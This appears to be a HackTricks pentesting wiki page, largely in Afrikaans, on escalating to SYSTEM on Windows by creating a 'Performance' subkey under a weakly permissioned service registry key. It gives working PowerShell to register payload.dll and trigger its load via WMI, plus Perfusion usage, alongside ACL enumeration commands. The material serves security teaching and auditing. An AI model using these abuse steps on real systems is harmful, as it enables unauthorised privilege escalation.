# AppendData/AddSubdirectory Permission over Service Registry

{{#include ../../banners/hacktricks-training.md}}

**Die oorspronklike plasing is** [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)

## Opsomming

As jy slegs **`Create Subkey`** / **`AppendData/AddSubdirectory`** op ’n service registry key het, is dit steeds ’n goeie privesc leidraad. Jy kan gewoonlik **nie** `ImagePath`, `ServiceDll`, of ander bestaande waardes direk oorskryf nie, maar jy kan dalk steeds ’n **`Performance`** kind sleutel skep onder:

- **`HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`**
- **`HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`**
- Enige ander **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`** sleutel waar jou token **`KEY_CREATE_SUB_KEY`** het

Die truuk is dat Windows steeds die ou **PerfLib V1** registration model ondersteun. As ’n service ’n **`Performance`** subkey het, kan Windows ’n DLL van daar laai wanneer ’n performance counter consumer data aanvra.

Volgens Microsoft dokumentasie is die minimum registration:
```text
HKLM\SYSTEM\CurrentControlSet\Services\<service>\Performance
Library = C:\Path\payload.dll
Open    = OpenPerfData
Collect = CollectPerfData
Close   = ClosePerfData
```
So die offensiewe gevolgtrekking is: **moenie ’n service registry finding weggooi net omdat jy net `CreateSubKey` gekry het in plaas van `SetValue` nie**.

## Why this is enough for code execution

Die `Performance` subkey bestaan gewoonlik **nie** by default op hierdie services nie, so **`KEY_CREATE_SUB_KEY`** is die primitive wat jy nodig het. Sodra die key bestaan en `Library`/`Open`/`Collect`/`Close` bevat, kan enige **performance counter consumer** die DLL load trigger.

’n Paar belangrike besonderhede:

- Die **`Library`** value kan na ’n **full DLL path** wys.
- Die DLL moet **`OpenPerfData`**, **`CollectPerfData`**, en **`ClosePerfData`** export en **`ERROR_SUCCESS`** return.
- Die code loop in die **consumer's context**, **nie noodwendig in die vulnerable service process self nie**.
- In die klassieke `RpcEptMapper` / `Dnscache` case kan ’n **WMI performance query** maak dat **`wmiprvse.exe`** die DLL as **`NT AUTHORITY\SYSTEM`** load.

Dis hoekom die primitive maklik gemis word during triage: die parent service key is nie "fully writable" nie, maar dit is steeds weaponizable.

## Quick enumeration

Manual spot-check with **AccessChk**:
```bash
accesschk.exe -k -w hklm\system\currentcontrolset\services\rpceptmapper
accesschk.exe -k -w hklm\system\currentcontrolset\services\dnscache
```
PowerShell voorbeeld om te soek na lae-privileged principals met **`CreateSubKey`** op diens sleutels:
```powershell
Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services | ForEach-Object {
$weak = (Get-Acl $_.PSPath).Access | Where-Object {
$_.AccessControlType -eq 'Allow' -and
($_.RegistryRights -band [System.Security.AccessControl.RegistryRights]::CreateSubKey) -eq [System.Security.AccessControl.RegistryRights]::CreateSubKey -and
$_.IdentityReference -match 'Users|Authenticated Users|INTERACTIVE|Network Configuration Operators'
}
if ($weak) {
[pscustomobject]@{Service=$_.PSChildName; Principals=($weak.IdentityReference -join ', '); Rights=($weak.RegistryRights -join '; ')}
}
}
```
Nuttige tooling:

- **PrivescCheck**: `Get-ModifiableRegistryPath` is spesifiek geskep om hierdie klas van probleem op te spoor.
- **SharpUp**: `SharpUp.exe audit ModifiableServiceRegistryKeys`
- **Perfusion**: outomatiseer DLL drop, `Performance` registrasie, WMI-trigger, token duplication, en cleanup op legacy kwesbare teikens (byvoorbeeld: `Perfusion.exe -c cmd -i -k Dnscache`).

## Abuse flow

Skep die `Performance` subkey en vul die vereiste waardes in:
```powershell
$svc = 'RpcEptMapper' # or Dnscache / NetBT / another vulnerable service
$k = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc\Performance"
New-Item $k -Force | Out-Null
New-ItemProperty $k -Name Library -Value "$pwd\payload.dll" -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Open -Value 'OpenPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Collect -Value 'CollectPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Close -Value 'ClosePerfData' -PropertyType String -Force | Out-Null
```
Dan aktiveer ’n **geprivilegieerde** performance consumer. ’n Klassieke voorbeeld is ’n WMI-navraag oor `Win32_Perf*` classes:
```powershell
powershell.exe -NoProfile -Command "Get-WmiObject -List | Where-Object { $_.Name -like 'Win32_Perf*' } | Out-Null"
```
Operasionele notas:

- Om **`perfmon.exe`** te laat loop is nuttig om te verifieer dat die counter-registrasie korrek is, maar dit laai gewoonlik net die DLL in **jou eie user context**.
- Vir ’n werklike LPE, trigger ’n **privileged** consumer soos **WMI**.
- As jy jou eie exploit skryf, laat om **`cmd.exe`** direk van binne die DLL te spawn, laat jou gewoonlik met ’n shell in **session 0**. **Perfusion** los dit op deur die privileged token te duplicate in ’n proses wat suspended in die attacker se session geskep is.
- Pas die DLL-architecture by die target consumer (**x64 op x64 systems**).

## Version notes / recent developments

Histories was die ingeboude weak keys:

- **Windows 7 / Windows Server 2008 R2**: `RpcEptMapper` en `Dnscache`
- **Windows 8 / Windows Server 2012**: `RpcEptMapper`

`Perfusion` merk op dat die **April 2021** updates die maklike exploitation path op opgedateerde **Windows 8 / Windows Server 2012** verwyder het, terwyl **Windows 7 / Windows Server 2008 R2** steeds exploitable gebly het via **`Dnscache`**.

Hierdie primitive is **nie net histories** nie. In **January 2025**, het Microsoft ’n verwante AD DS issue gepatch waar lede van **`Network Configuration Operators`** subkeys onder **`Dnscache`** en **`NetBT`** kon create, en dieselfde **Performance-counter DLL registration** idee kon hergebruik word om **SYSTEM** op supported systems te bereik.

Die moderne les is dus generies: wanneer ’n low-privileged principal **`CreateSubKey`** op **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`** het, check of ’n **`Performance`** child key genoeg is voordat jy die finding afskryf.

## References

- [Microsoft Learn - Creating the Application's Performance Key](https://learn.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key)
- [BirkeP - Active Directory Domain Services Elevation of Privilege Vulnerability (CVE-2025-21293)](https://birkep.github.io/posts/Windows-LPE/)
{{#include ../../banners/hacktricks-training.md}}
